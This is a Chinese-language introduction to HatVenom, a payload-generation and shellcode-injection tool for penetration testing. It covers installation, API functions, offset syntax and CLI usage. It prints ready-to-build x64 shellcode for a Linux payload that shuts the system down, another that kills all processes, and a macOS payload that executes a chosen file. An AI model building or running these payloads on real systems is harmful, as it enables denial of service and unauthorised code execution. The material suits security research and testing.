![](https://image.3001.net/images/20210719/1626706997_60f59435c9ba38030776c.jpg!small)

## 关于HatVenom

HatVenom是一款功能强大的本地Payload生成和Shellcode注入工具，可以帮助广大研究人员针对多种常见操作系统平台或架构进行渗透测试研究。

## 功能介绍

> 支持大多数常见的可执行格式，例如elf、macho、pe等。
>
> 支持大多数常见的平台架构，例如x64、x86、aarch64、armle、mipsle、mipsbe等。
>
> 能够通过修改预定义偏移量来修改Shellcode。

## 工具安装

由于HatVenom使用Python3开发，因此首先需要在本地设备上安装并配置好Python3环境。接下来，广大研究人员可以使用下列命令下载并安装HatVenom：

    
    
    pip3 install git+https://github.com/EntySec/HatVenom

## 基础函数

下面给出的是HatVenom所有的基础函数，可以用于生成Pyaload、转换数据或注入Shellcode：

> ip_bytes(ip)：将IP地址转换为Shellcode所支持的字节数据；
>
> port_bytes(port)：将数字端口号转换为Shellcode所支持的字节数据；
>
> string_bytes(string)：将字符串转换为Shellcode所支持的字节数据；
>
> generate(file_format, arch, shellcode,
> offsets={})：针对指定的目标设备生成Payload和Shellcode；
>
> generate_to(file_format, arch, shellcode, offsets={},
> filename='a.out')：针对指定的目标设备生成Payload和Shellcode，并存储至一个指定的文件中；

## 生成Payload

在HatVenom的帮助下，我们可以轻松针对不同的目标设备快速生成Payload。比如说，我们针对Linux生成一个简单的名为“shutdown”的Payload，并将其存储至“a.out”文件中：

    
    
    from hatvenom import HatVenom
    
     
    
    shellcode = (
    
        b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
    
        b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
    
        b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
    
        b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
    
        b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
    
        b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
    
        b"\x50\x48\x89\xe7\x52\x53\x51\x57"
    
        b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
    
        b"\x05"
    
    )
    
     
    
    hatvenom = HatVenom()
    
    hatvenom.generate_to('elf', 'x64', shellcode)

## Payload偏移量

Payload偏移量是一个变量，可以用于在预处理阶段向shelcode添加内容。偏移量样例如下：

    
    
    \x90\x90\x90\x90:message:string:\x90\x90\x90\x90

其中的“message”即为偏移量名称，“string”为偏移量类型。因此，偏移量的基本使用方式如下：

    
    
    [shellcode]:[name]:[type]:[shellcode]

 **下面给出的是几种偏移量类型：**

> string：在预处理阶段需要转换为字节数据的明文内容；
>
> ip：在预处理阶段需要转换为字节数据的IP地址；
>
> port：在预处理阶段需要转换为字节数据的数字端口号；

因此，如果你想要替换其中的字节数据，而不是string、ip或port的话，可以使用下列命令形式：

    
    
    [shellcode]:[name]:[shellcode]

接下来，我们生成一个简单的Payload，它将执行偏移量文件“file”（针对macOS）并存储至“a.out”中：

    
    
    from hatvenom import HatVenom
    
     
    
    shellcode = (
    
        b"\x48\x31\xf6\x56\x48\xbf"
    
        b":file:string:"
    
        b"\x57\x48\x89\xe7\x48\x31"
    
        b"\xd2\x48\x31\xc0\xb0\x02"
    
        b"\x48\xc1\xc8\x28\xb0\x3b"
    
        b"\x0f\x05"
    
    )
    
     
    
    hatvenom = HatVenom()
    
    hatvenom.generate_to('macho', 'x64', shellcode, {'file':'//bin/ps'})

## HatVenom命令行接口

HatVenom也提供了自己的命令行接口，可以通过执行命令“hatvenom”来调用：

    
    
    usage: hatvenom [-h] [--format FORMAT] [--arch ARCH] [--shellcode SHELLCODE]
    
                    [--offsets OFFSETS] [-o OUTPUT] [-l]
    
     
    
    Powerful payload generation and shellcode injection tool that provides support
    
    for common platforms and architectures.
    
     
    
    optional arguments:
    
      -h, --help            显示这个帮助信息并退出
    
      --format FORMAT      针对的目标平台
    
      --arch ARCH           针对的目标架构
    
      --shellcode SHELLCODE
    
                            待注入的Shellcode
    
      --offsets OFFSETS        Shellcode偏移量
    
      -o OUTPUT, --output OUTPUT
    
                            用于存储生成Payload的文件
    
      -l, --list                列出所有的格式和平台

### 使用样例

我们可以生成一个针对Linux的简单Payload，该Payload将会终止目标Linux系统上所有进程的运行，并将其存储至“a.out”中：

    
    
    hatvenom --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"

## 项目地址

 **HatVenom：** 【[ _GitHub传送门_](https://github.com/EntySec/HatVenom)】

